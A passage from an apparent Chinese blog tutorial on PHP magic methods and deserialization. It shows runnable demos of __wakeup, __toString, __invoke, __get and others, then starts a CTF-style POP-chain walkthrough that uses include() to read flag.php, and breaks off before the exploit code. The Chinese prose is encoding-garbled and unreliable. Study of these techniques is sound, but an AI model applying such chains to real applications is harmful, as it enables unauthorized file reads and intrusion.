class="string">&quot;6\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><br>è¾“å‡º<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">6</span><br><span class="line">6  </span><br><span class="line">è§¦å‘äº†ææ„å‡½æ•°1æ¬¡</span><br><span class="line"> è§¦å‘äº†ææ„å‡½æ•°1æ¬¡</span><br></pre></td></tr></table></figure><br>é€šè¿‡è¾“å‡ºç»“æœä¹Ÿå¯ä»¥éƒ½æ˜¯åœ¨ä»£ç å®Œå…¨è¿è¡Œåè§¦å‘</p><h3 id="ææ„å‡½æ•°çš„ç®€å•ä¾‹é¢˜"><a href="#ææ„å‡½æ•°çš„ç®€å•ä¾‹é¢˜" class="headerlink" title="ææ„å‡½æ•°çš„ç®€å•ä¾‹é¢˜"></a>ææ„å‡½æ•°çš„ç®€å•ä¾‹é¢˜</h3><img src="/2023/11/25/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/li1-1.png" class="" title="Alt text"><h2 id="sleep-åºåˆ—åŒ–çš„æ—¶å€™è§¦å‘ï¼ˆå…ˆsleepååºåˆ—åŒ–ï¼‰"><a href="#sleep-åºåˆ—åŒ–çš„æ—¶å€™è§¦å‘ï¼ˆå…ˆsleepååºåˆ—åŒ–ï¼‰" class="headerlink" title="__sleep()åºåˆ—åŒ–çš„æ—¶å€™è§¦å‘ï¼ˆå…ˆsleepååºåˆ—åŒ–ï¼‰"></a>__sleep()åºåˆ—åŒ–çš„æ—¶å€™è§¦å‘ï¼ˆå…ˆsleepååºåˆ—åŒ–ï¼‰</h2><p>è§¦å‘æ—¶æœºï¼šåœ¨å¯¹è±¡åºåˆ—åŒ–ä¹‹å‰è§¦å‘ã€‚<br>åŠŸèƒ½ï¼šè¿”å›éœ€è¦è¢«åºåˆ—åŒ–å­˜å‚¨çš„æˆå‘˜å˜é‡ï¼Œåˆ é™¤ä¸å¿…è¦çš„å˜é‡ã€‚<br>å‚æ•°ï¼šå‚æ•°æ˜¯æˆå‘˜å±æ€§ã€‚<br>è¿”å›å€¼ï¼šéœ€è¦è¢«åºåˆ—åŒ–å­˜å‚¨çš„æˆå‘˜å±æ€§ã€‚<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;nickname&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¾“å‡ºçš„åºåˆ—åŒ–ç»“æœä¸­æ¯”æ­£å¸¸è¾“å‡ºè¦å°‘äº†passwordè¿™ä¸ªæˆå‘˜å˜é‡ï¼ŒåŸå› æ˜¯__sleepå‡½æ•°åœ¨åºåˆ—åŒ–ä¹‹å‰æ‰§è¡Œä¸”åªè¿”å›äº†usernameå’Œnicknameåˆ é™¤äº†passwordæ‰€ä»¥åºåˆ—åŒ–æ—¶passwordæ²¡æœ‰åºåˆ—åŒ–</p><h2 id="weakup-weakupæ˜¯åœ¨ååºåˆ—åŒ–ä¹‹å‰è§¦å‘ï¼Œ"><a href="#weakup-weakupæ˜¯åœ¨ååºåˆ—åŒ–ä¹‹å‰è§¦å‘ï¼Œ" class="headerlink" title="__weakup() weakupæ˜¯åœ¨ååºåˆ—åŒ–ä¹‹å‰è§¦å‘ï¼Œ"></a>__weakup() weakupæ˜¯åœ¨ååºåˆ—åŒ–ä¹‹å‰è§¦å‘ï¼Œ</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">class User &#123;</span><br><span class="line">    const SITE = &#x27;uusama&#x27;;</span><br><span class="line">    public $username;</span><br><span class="line">    public $nickname;</span><br><span class="line">    private $password;</span><br><span class="line">    private $order;</span><br><span class="line">    public function __wakeup() &#123;</span><br><span class="line">        $this-&gt;password = $this-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$user_ser = &#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;&#x27;;</span><br><span class="line">var_dump(unserialize($user_ser))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object(User)#1 (4) &#123; [&quot;username&quot;]=&gt; string(1) &quot;a&quot; [&quot;nickname&quot;]=&gt; string(1) &quot;b&quot; [&quot;password&quot;:&quot;User&quot;:private]=&gt; string(1) &quot;a&quot; [&quot;order&quot;:&quot;User&quot;:private]=&gt; NULL &#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æŸ¥çœ‹ä¸Šé¢çš„ç»“æœå¯ä»¥å‘ç°å…¶è¾“å‡ºçš„å€¼è¡¨ç¤ºå…¶ååºåˆ—åŒ–ä¹‹åå¤šäº†ä¸€ä¸ªå˜é‡<code>password</code>è¿™å°±æ˜¯å› ä¸ºåœ¨ååºåˆ—åŒ–æ—¶weakupæ‰§è¡Œæ·»åŠ äº†ä¸€ä¸ªpasswordå¹¶èµ‹å€¼ä¸ºusernameçš„å€¼</p><h2 id="tostring-å’Œinvoke"><a href="#tostring-å’Œinvoke" class="headerlink" title="tostring()å’Œinvoke()"></a><strong>tostring()å’Œ</strong>invoke()</h2><h3 id="tostring-æ˜¯é”™è¯¯çš„å°†å¯¹è±¡å½“æˆå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘"><a href="#tostring-æ˜¯é”™è¯¯çš„å°†å¯¹è±¡å½“æˆå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘" class="headerlink" title="__tostring()æ˜¯é”™è¯¯çš„å°†å¯¹è±¡å½“æˆå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘"></a>__tostring()æ˜¯é”™è¯¯çš„å°†å¯¹è±¡å½“æˆå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class text&#123;</span><br><span class="line">    public $name=&quot;panpan&quot;;</span><br><span class="line">    function __tostring()</span><br><span class="line">    &#123;</span><br><span class="line">        return &quot;è§¦å‘&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$p=new text;</span><br><span class="line">echo $p;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è§¦å‘</span><br></pre></td></tr></table></figure><p>ä»è¾“å‡ºç»“æœæˆ‘ä»¬å¯ä»¥çœ‹å‡ºå½“æˆ‘ä»¬ä½¿ç”¨echoç­‰è¾“å‡ºå­—ç¬¦ä¸²çš„å‡½æ•°è¾“å‡ºå¯¹è±¡æ—¶ä¼šè§¦å‘å‡½æ•°__tostringã€‚</p><h3 id="invoke-æ˜¯é”™è¯¯çš„å°†å¯¹è±¡å½“æˆå‡½æ•°è¾“å‡ºæ—¶è§¦å‘"><a href="#invoke-æ˜¯é”™è¯¯çš„å°†å¯¹è±¡å½“æˆå‡½æ•°è¾“å‡ºæ—¶è§¦å‘" class="headerlink" title="__invoke()æ˜¯é”™è¯¯çš„å°†å¯¹è±¡å½“æˆå‡½æ•°è¾“å‡ºæ—¶è§¦å‘"></a>__invoke()æ˜¯é”™è¯¯çš„å°†å¯¹è±¡å½“æˆå‡½æ•°è¾“å‡ºæ—¶è§¦å‘</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class text&#123;</span><br><span class="line">    public $name=&quot;panpan&quot;;</span><br><span class="line">    function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;è§¦å‘&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$p=new text;</span><br><span class="line">echo $p();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¾“å‡º<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è§¦å‘</span><br></pre></td></tr></table></figure><br>å¯ä»¥çœ‹å‡ºå½“æˆ‘ä»¬ä»¥å‡½æ•°çš„æ–¹å¼è¿è¡Œå¯¹è±¡æ—¶è§¦å‘invoke()ã€‚</p><h2 id="é­”æœ¯æ–¹æ³•é”™è¯¯è°ƒç”¨"><a href="#é­”æœ¯æ–¹æ³•é”™è¯¯è°ƒç”¨" class="headerlink" title="é­”æœ¯æ–¹æ³•é”™è¯¯è°ƒç”¨"></a>é­”æœ¯æ–¹æ³•é”™è¯¯è°ƒç”¨</h2><h3 id="call"><a href="#call" class="headerlink" title="__call()"></a>__call()</h3><p>call()åœ¨æˆ‘ä»¬é”™è¯¯çš„è°ƒç”¨ä¸€ä¸ªå¯¹è±¡ä¸­æ²¡æœ‰çš„æ–¹æ³•æ—¶è§¦å‘ï¼Œå…¶å‚æ•°æœ‰ä¸¤ä¸ªï¼Œè¿”å›çš„å€¼åˆ†åˆ«æ˜¯ä¸å­˜åœ¨çš„é­”æœ¯æ–¹æ³•åå’Œå‚æ•°ã€‚<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class text&#123;</span><br><span class="line">    public $name=&quot;panpan&quot;;</span><br><span class="line">    function __call($a,$b)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;$a,$b[0]&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$p=new text();</span><br><span class="line">$p-&gt;calll(&#x27;ab&#x27;);</span><br></pre></td></tr></table></figure><br>è¾“å‡º<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calllï¼Œab</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥çœ‹å‡ºè¾“å‡ºçš„å€¼ä¸ºé”™è¯¯è°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•åcalllå’Œå…¶å‚æ•°abã€‚</p><h3 id="callstatic"><a href="#callstatic" class="headerlink" title="__callstatic()"></a>__callstatic()</h3><p>__callstatic()<br>è§¦å‘æ—¶æœºï¼šé™æ€è°ƒç”¨æˆ–è°ƒç”¨æˆå‘˜å¸¸é‡æ—¶ä½¿ç”¨çš„æ–¹æ³•ä¸å­˜åœ¨æ—¶è§¦å‘<br>å‚æ•°æœ‰ä¸¤ä¸ª<br>è¿”å›å€¼ä¸ºé”™è¯¯è°ƒç”¨çš„æ–¹æ³•å’Œå‚æ•°ã€‚<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class text&#123;</span><br><span class="line">    public $name=&quot;panpan&quot;;</span><br><span class="line">    function __callstatic($a,$b)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;$a,$b[0]&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$p=new text();</span><br><span class="line">$p::calll(&#x27;a&#x27;);</span><br></pre></td></tr></table></figure><br>è¾“å‡º<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calll,a</span><br></pre></td></tr></table></figure></p><h3 id="get"><a href="#get" class="headerlink" title="_get()"></a>_get()</h3><p>è§¦å‘æ—¶æœºï¼šè°ƒç”¨çš„æˆå‘˜å±æ€§ä¸å­˜åœ¨<br>å‚æ•°ï¼šä¸€ä¸ªå‚æ•°$a<br>è¿”å›å€¼:ä¸å­˜åœ¨çš„æˆå‘˜å±æ€§åç§°<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">text</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$p</span>=<span class="keyword">new</span> <span class="title function_ invoke__">text</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$p</span>-&gt;benben;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">benben</span><br></pre></td></tr></table></figure><br>é€šè¿‡è¾“å‡ºæˆ‘ä»¬å¯ä»¥çœ‹å‡ºæ¥è¾“å‡ºäº†ä¸å­˜åœ¨çš„æˆå‘˜å˜é‡åbenben</p><h3 id="set"><a href="#set" class="headerlink" title="__set()"></a>__set()</h3><p>è§¦å‘æ—¶æœºï¼šå½“æˆ‘ä»¬ç»™ä¸€ä¸ªä¸å­˜åœ¨çš„æˆå‘˜å±æ€§èµ‹å€¼æ—¶è§¦å‘__set()<br>å‚æ•°ï¼šä¸¤ä¸ª<br>è¿”å›å€¼ï¼šä¸å­˜åœ¨çš„æˆå‘˜å±æ€§åç§°å’Œèµ‹çš„å€¼<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">text</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;panpan&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span>,<span class="subst">$b</span>&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$p</span>=<span class="keyword">new</span> <span class="title function_ invoke__">text</span>();</span><br><span class="line"><span class="variable">$p</span>-&gt;panpan=<span class="number">1</span>;</span><br></pre></td></tr></table></figure><br>è¾“å‡º<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">panpan,1</span><br></pre></td></tr></table></figure></p><h3 id="isset"><a href="#isset" class="headerlink" title="__isset()"></a>__isset()</h3><p>è§¦å‘æ—¶æœº:å¯¹ä¸å¯è®¿é—®çš„å±æ€§ï¼ˆprivateæˆ–protectedï¼‰æˆ–ä¸å­˜åœ¨çš„,ä½¿ç”¨isset()æˆ–empty()æ—¶,è§¦å‘__isset()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">text</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;panpan&quot;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$name2</span>=<span class="string">&quot;dazhuang&quot;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$name3</span>=<span class="string">&quot;haha&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$b</span>&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$p</span>=<span class="keyword">new</span> <span class="title function_ invoke__">text</span>();</span><br><span class="line">    <span class="keyword">isset</span>(<span class="variable">$p</span>-&gt;name);</span><br><span class="line">    <span class="keyword">isset</span>(<span class="variable">$p</span>-&gt;name2);</span><br><span class="line">    <span class="keyword">empty</span>(<span class="variable">$p</span>-&gt;name2);</span><br><span class="line">    <span class="keyword">isset</span>(<span class="variable">$p</span>-&gt;name3);</span><br><span class="line">    <span class="keyword">isset</span>(<span class="variable">$p</span>-&gt;xxxx);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>è¾“å‡º<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name2</span><br><span class="line">name2</span><br><span class="line">name3</span><br><span class="line">xxxx</span><br></pre></td></tr></table></figure></p><h3 id="unset"><a href="#unset" class="headerlink" title="unset"></a>unset</h3><p>è§¦å‘æ—¶æœº:å¯¹ä¸å¯è®¿é—®çš„å±æ€§ä½¿ç”¨usset()æ—¶è§¦å‘<br>å‚æ•°:ä¸€ä¸ª<br>è¿”å›å€¼:ä¸å­˜åœ¨çš„æˆå‘˜å±æ€§ã€‚<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">text</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;panpan&quot;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$name2</span>=<span class="string">&quot;dazhuang&quot;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$name3</span>=<span class="string">&quot;haha&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$b</span>&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$p</span>=<span class="keyword">new</span> <span class="title function_ invoke__">text</span>();</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$p</span>-&gt;name);</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$p</span>-&gt;name2);</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$p</span>-&gt;name3);</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$p</span>-&gt;xxxx);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>è¾“å‡º<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name2</span><br><span class="line">name3</span><br><span class="line">xxxx</span><br></pre></td></tr></table></figure></p><h3 id="clone"><a href="#clone" class="headerlink" title="__clone()"></a>__clone()</h3><p>è§¦å‘æ—¶æœº:å½“ä½¿ç”¨cloneå…³é”®å­—è€æ‹·è´ä¸€ä¸ªå¯¹è±¡æ—¶è§¦å‘ï¼Œæ–°å¯¹è±¡ä¼šè‡ªåŠ¨è°ƒç”¨å®šä¹‰çš„é­”æœ¯æ–¹æ³•__clone<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">class text&#123;</span><br><span class="line">    public $name=&quot;panpan&quot;;</span><br><span class="line">    private $naem2=&quot;dazhuang&quot;;</span><br><span class="line">    function __clone()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;æ‹·è´&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$p=new text();</span><br><span class="line">$haha=clone($p);</span><br></pre></td></tr></table></figure><br>è¾“å‡º<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ‹·è´</span><br></pre></td></tr></table></figure></p><h1 id="popé“¾çš„æ„é€ "><a href="#popé“¾çš„æ„é€ " class="headerlink" title="popé“¾çš„æ„é€ "></a>popé“¾çš„æ„é€ </h1><p>popé“¾å°±æ˜¯åˆ©ç”¨é­”æœ¯æ–¹æ³•ï¼Œæ¥é“¾æ¥å…¶ä»–æ–¹æ³•ï¼Œæœ€ç»ˆé“¾æ¥åˆ°å¯ä»¥åˆ©ç”¨æ¼æ´çš„æ–¹æ³•ï¼Œå®ä¾‹å¦‚ä¸‹<br><img src="/2023/11/25/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/pop1-1.png" class="" title="Alt text"><br>æˆ‘ä»¬è§‚å¯Ÿé¢˜ç›®å‘ç°å¯ä»¥åˆ©ç”¨çš„å‡½æ•°ä¸º<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="variable">$value</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span></span><br></pre></td></tr></table></figure><br>åœ¨åŠ ä¸Šå¼€å¤´é¢˜ç›®è¯´flag is in flag.phpé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨includeåŒ…å«flag.phpä¹‹åå°±å¯ä»¥å¾—åˆ°flag<br>åœ¨é™¤äº†ç±»çš„å®šä¹‰ä¹‹å¤–å°±åªæœ‰ä¸€ä¸ªååºåˆ—åŒ–å‡½æ•°æ‰€ä»¥æˆ‘ä»¬è¦åˆ©ç”¨ååºåˆ—åŒ–ä¼šè§¦å‘çš„å‡½æ•°<strong>wakeup()æ¥ä½œä¸ºèµ·ç‚¹æœ€ç»ˆé“¾æ¥åˆ°<code>Modifierçš„appendæ–¹æ³•</code><br>æˆ‘ä»¬å¯ä»¥å°†<code>$siurce</code>èµ‹å€¼ä¸ºå¯¹è±¡<code>show</code>åœ¨å°†<code>$str</code>èµ‹å€¼ä¸ºå¯¹è±¡<code>text</code>ï¼Œå› ä¸ºå½“`</strong>wakeup()<code>è§¦å‘æ—¶ä¼šè¾“å‡º</code>source<code>è€Œè¾“å‡ºæ—¶ä¼šå› ä¸ºé”™è¯¯çš„å‰‘å¯¹è±¡</code>show<code>å½“å­—ç¬¦ä¸²è¾“å‡ºè§¦å‘</code>tosting<code>ï¼Œåˆå› ä¸ºæˆ‘ä»¬å°†</code>$str<code>èµ‹å€¼ä¸ºå¯¹è±¡</code>text<code>è€Œ</code>text<code>é‡Œæ²¡æœ‰</code>source<code>é‚£ä¹ˆå°±ä¼šè§¦å‘</code><strong>get()<code>ã€‚è€Œ</code></strong>get()<code>æ–¹æ³•æ˜¯è¿”å›ä¸€ä¸ªå‡½æ•°</code>functionï¼ˆï¼‰<code>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°†</code>$p<code>èµ‹å€¼ä¸ºå¯¹è±¡</code>Modifer<code>ä»è€Œä½¿</code>function<code>è¢«èµ‹å€¼ä¸ºå¯¹è±¡</code>Modifier<code>ï¼Œé‚£ä¹ˆå°±ä¼šå› é”™è¯¯çš„å°†å¯¹è±¡å½“å‡½æ•°åˆ©ç”¨ä»è€Œå¯¼è‡´è§¦å‘</code><strong>invoke()<code>ï¼Œè€Œ</code></strong>invoke()<code>å›è°ƒç”¨</code>append()<code>æ–¹æ³•,é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°†</code>value<code>èµ‹å€¼ä¸º</code>flag.php<code>ä»è€Œè¾“å‡º</code>flag`<br>äº†è§£ä»¥ä¸Šè¿‡ç¨‹æˆ‘ä»¬å°±å¯ä»¥å¼€å§‹æ„é€ popé“¾äº†ä»£ç å¦‚ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 